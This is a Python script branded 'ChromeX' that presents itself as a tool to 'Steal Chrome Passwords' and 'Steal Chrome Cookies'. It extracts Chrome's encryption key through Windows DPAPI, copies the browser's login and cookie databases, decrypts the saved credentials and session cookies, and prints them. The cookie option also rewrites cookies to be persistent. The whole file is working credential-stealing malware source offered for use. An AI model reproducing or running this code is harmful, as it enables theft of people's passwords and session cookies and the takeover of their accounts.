#!/usr/env/bin python3

from Crypto.Cipher import AES
from datetime import timedelta, datetime
from termcolor import colored
import os
import json
import base64
import sqlite3
import win32crypt
import shutil
import pyfiglet
import time

def banner():
    os.system("cls")
    ascii_banner = pyfiglet.figlet_format("ChromeX")
    print(colored("###################################################################", "red", attrs=['bold']))
    print(colored(ascii_banner + "	                                                  ", "red", attrs=['bold']))
    print(colored(""" Coded by: 0xmarWan7A                    								   	
 Github: https://github.com/0xmarWan7A/           				 """ , "red", attrs=['bold']))
    print(colored("###################################################################",  "red", attrs=['bold']))
    print("")

banner()

def chrome_datetime(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryptionKey():

    encryptionKey_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
                                                "User Data", "Local State")

    with open(encryptionKey_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
        
        encryptionKey = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryptionKey = encryptionKey[5:]
        
        return win32crypt.CryptUnprotectData(encryptionKey, None, None, None, 0)[1]


def decryption(password, encryptionKey):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryptionKey, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()

    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "[-] No Passwords"
    

print(colored("[+] Select Option : " , "red", attrs=['bold']))
print(colored("\n[1] Steal Chrome Passwords " , "red", attrs=['bold']))
print(colored("[2] Steal Chrome Cookies " , "red", attrs=['bold']))
option = int(input(colored("\nEnter option number : " , "blue", attrs=['bold'])))

if option == 1:

    def main1():
        key = fetching_encryptionKey()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
                                        "User Data", "Default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins"
        " order by date_last_used")

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = decryption(row[3], key)
            date_of_creation = row[4]
            last_usage = row[5]

            if user_name or decrypted_password:
                print(colored(f"\n\nMain URL: {main_url}", "green", attrs=['bold']))
                print(colored(f"Login URL: {login_page_url}", "green", attrs=['bold']))
                print(colored(f"User name: {user_name}", "green", attrs=['bold']))
                print(colored(f"Decrypted Password: {decrypted_password}", "green", attrs=['bold']))
                print(colored(f"Date_of_creation: {date_of_creation}", "green", attrs=['bold']))
                print(colored(f"Last_usage: {last_usage}", "green", attrs=['bold']))
            else:
                continue

            if date_of_creation != 86400000000 and date_of_creation:
                print(colored(f"Creation date: {str(chrome_datetime(date_of_creation))}", "green", attrs=['bold']))

            if last_usage != 86400000000 and last_usage:
                print(colored(f"Last Used: {str(chrome_datetime(last_usage))}", "green", attrs=['bold']))
            print("=" * 100)
        cursor.close()
        db.close()

        try:

            # trying to remove the copied db file as 
            # well from local computer
            os.remove(filename)
        except:
            pass
    main1()     

elif option == 2:   
    def main2():
        key = fetching_encryptionKey()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
                                        "User Data", "Default", "Network", "Cookies")
        filename = "Cookies.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")

        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decryption(encrypted_value, key)
            else:
                # already decrypted
                decrypted_value = value
            print(colored(f"""
================================================================
Host: {host_key}
Cookie name: {name}
Cookie value (decrypted): {decrypted_value}
Creation datetime (UTC): {chrome_datetime(creation_utc)}
Last access datetime (UTC): {chrome_datetime(last_access_utc)}
Expires datetime (UTC): {chrome_datetime(expires_utc)}
================================================================
            """, "green", attrs=['bold']))
            # update the cookies table with the decrypted value
            # and make session cookie persistent
            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))
        # commit changes
        db.commit()
        # close connection
        db.close()
    main2()
    


